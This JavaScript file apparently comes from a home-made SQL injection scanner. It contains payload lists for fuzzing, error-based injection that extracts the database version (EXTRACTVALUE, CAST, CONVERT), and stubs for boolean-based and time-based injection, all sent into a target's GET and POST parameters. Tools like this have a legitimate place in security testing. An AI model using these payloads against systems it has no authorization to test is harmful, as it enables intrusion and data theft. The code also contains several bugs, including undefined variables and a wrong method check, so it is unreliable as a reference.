import { Scanner } from './Scanner.js'
import { removeTrailingSlash, sendRequest } from './utils.js' 

export class Injecter {
    static fuzzingPayload = ["'", '"', "%5C", "')", '")', '";', "';"];
    static ErrorBasedPayload = [
        "' AND (SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))))a)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=CONVERT(int,@@version)--",    
    ]


    constructor (cible, baseline) {
        this.cible = cible;
        this.result = 
            {
                url : this.cible.url,
                parameter : "",
                method : this.cible.method,
                vulnerabilityType : "",
                confidence : "",
                score : 0,
                payloadSent : ""
            };
        this.baseline = baseline;
    }

    //Injection GET Basique, test tout les parametres
    async injectPayloadsGET(payload) {
        const params = Injecter.createParams(this.cible);
        let responses = [];

        for (const [paramToInject, _] of params) {
            const response = await this.injectPayloadsGETSimpleParam(payload, paramToInject, params);
            responses.push(response);
        }
        return responses;
    }

    //Injection GET Basique, test qu'une seul parametre
    async injectPayloadsGETSimpleParam(payload, paramToInject, params) {
        let craftedUrl = removeTrailingSlash(this.cible.url) + "?";
        for(const [param, value] of params) {
            if (param === paramToInject) {
                craftedUrl += `${param}=${payload}&`;
            }
            else {
                craftedUrl += `${param}=${value}&`
            }
            craftedUrl = craftedUrl.slice(0, -1);
        }

        console.log(`Injecting payload into (GET): ${craftedUrl}`);
        const response = await sendRequest(craftedUrl);
        return {
            injectedParam : paramToInject,
            response
        };
    }

    //Créer une autre fonction qui permet de tester qu'un seul parametres
    async injectPayloadsPOST(payload) {
        let responses = [];
        for (const param of this.cible.params) {
            const response = await this.injectPayloadsPOSTSimpleParam(payload, param);
            responses.push(response);
        }
        return responses;
    }

    //Enlever les cibles et url ici, utiliser this 
    async injectPayloadsPOSTSimpleParam(payload, paramToInject) {
        let postData = {};
        for (const param of this.cible.params) {

            //pour les tokens csrf
            if (param instanceof Object && param === paramToInject) {
                const key = Object.keys(param)[0];
                postData[key] = `${Object.values(param)[0]}`;
            } else if (param === paramToInject) {
                postData[param] = payload;
            } else {
                postData[param] = "test";
            }
        }

        console.log(`Injecting payload into form (POST): ${this.cible.url}`);
        const response = await sendRequest(this.cible.url, "POST", postData);
        return {
            injectedParam : paramToInject,
            response
        };
    }

    //Appeller par le scan
    async inject() {
        const resultOfFuzzingPayload = await this.injectFuzzingPayload();
        if(resultOfFuzzingPayload === "CONFIRMED") {
            return this.result;
        } else if (resultOfFuzzingPayload === "HIGH") {
            const resultOfErrorPayload = await this.injectErrorPayload();
            console.log(this.result);
            if(resultOfErrorPayload === "CONFIRMED") {
                return this.result;
            } else {
                return this.result;
            }
        } else {
            console.log(this.result);
            //Passer à injection complexe
        }
        //SI NO VULNERABILITY FAIRE LES INJECTIONS COMPLEXE
    }

    async injectFuzzingPayload() {
        //A injecter : ' " \ ') "; --
        for (const inject of Injecter.fuzzingPayload) {
            let injectedResults = [];
            if (this.cible === "POST") {
                injectedResults = await this.injectPayloadsPOST(inject);
            } else if (this.cible.method === "GET") {
                injectedResults = await this.injectPayloadsGET(inject);
            }

            for (const injectedResult of injectedResults) {
                const scanResult = Scanner.scanFuzzingPayload(this.baseline, injectedResult.response);
                if (scanResult !== null) {
                    this.result.parameter = injectedResult.injectedParam;
                    this.result.score = scanResult.addToScore;
                    this.result.payloadSent = inject;

                    if (scanResult.type === "Error-based SQL Injection") {
                        this.result.vulnerabilityType = `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`;
                        this.result.confidence = "CONFIRMED";
                        return "CONFIRMED";
                    } else if (scanResult.type === "Status Error") {
                        this.result.confidence = "HIGH";
                        return "HIGH";
                    }
                }
            }
        }
        return "NO VULNERABILITY";
    }

    async injectErrorPayload() {
        let payloads = this.changeErrorBasedPaylaods();
        for (const payload of payloads) {
            let injectedResult;
            if (this.cible.method === "POST") {
                injectedResult = await this.injectPayloadsPOSTSimpleParam(payload, this.result.parameter);
            } else {
                injectedResult = await this.injectPayloadsGETSimpleParam(payload, this.result.parameter, Injecter.createParams(this.cible));
            }
            const scanResult = Scanner.checkSQLError(this.baseline, injectedResult.response);
            if (scanResult !== null) {
                this.result.score = scanResultResult.addToScore;
                this.result.payloadSent = payload;
                this.result.vulnerabilityType = `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`;
                this.result.confidence = "CONFIRMED";
                return "CONFIRMED";
            }
        }    
        return "NO VULNERABILITY";
    }

    changeErrorBasedPaylaods() {
        let payloads = [];
        for (const payload of Injecter.ErrorBasedPayload) {
            payloads.push(payload.replace("'", this.result.payloadSent));
        }
        return payloads;
    }

    //Injection complexe
    async injectBooleanPayload() {
        let responses1;
        let responses2;
        if(this.cible.method === "POST") {
            responses1 = await this.injectPayloadsPOST("id=1 AND 1=1");
            responses2 = await this.injectPayloadsPOST("id=1 AND 1=2");
        } else {
            responses1 = injectPayloadsGET("id=1 AND 1=1");
            responses2 = injectPayloadsGET("id=1 AND 1=2");
        }
        //Send to scanner
    }

    async injectTimeBasedPayload() {
        let startTime = performance.now();
        if(this.cible.method === "POST") {
            const response = await this.injectPayloadsPOST("SLEEP(5)");
        } else {
            const response = await this.injectPayloadsGET("SLEEP(5)");
        }
        let endTime = performance.now();
        const duration1 = endTime - startTime;
        
        startTime = performance.now();
        if(cible.method === "POST") {
            const response = await this.injectPayloadsPOST("pg.sleep(5)");
        } else {
            const response = await this.injectPayloadsGET("pg.sleep(5)");
        }
        endTime = performance.now();
        const duration2 = endTime - startTime;
        
        //Check if it worked then
    }

    static createParams(cible){
        return cible.params.map(param => {
            if(param instanceof Object) {
                return [Object.keys(param)[0], Object.values(param)[0]];
            } else {
                return [param, "1"];
            }
        });
    }
}